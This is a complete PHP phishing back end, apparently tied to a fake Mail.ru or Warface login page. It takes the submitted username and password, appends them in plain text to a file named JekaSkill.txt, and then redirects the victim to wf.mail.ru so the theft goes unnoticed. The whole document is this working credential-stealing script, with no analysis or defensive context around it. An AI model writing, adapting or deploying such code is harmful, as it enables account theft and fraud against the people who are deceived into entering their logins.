<?PHP 
$Log = $_POST['username']; 
$Pass = $_POST['password']; 
$log = fopen("JekaSkill.txt","at"); 
fwrite($log,"$Log:$Pass\n"); 
fclose($log); 
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://wf.mail.ru'></head></html>"; 
?>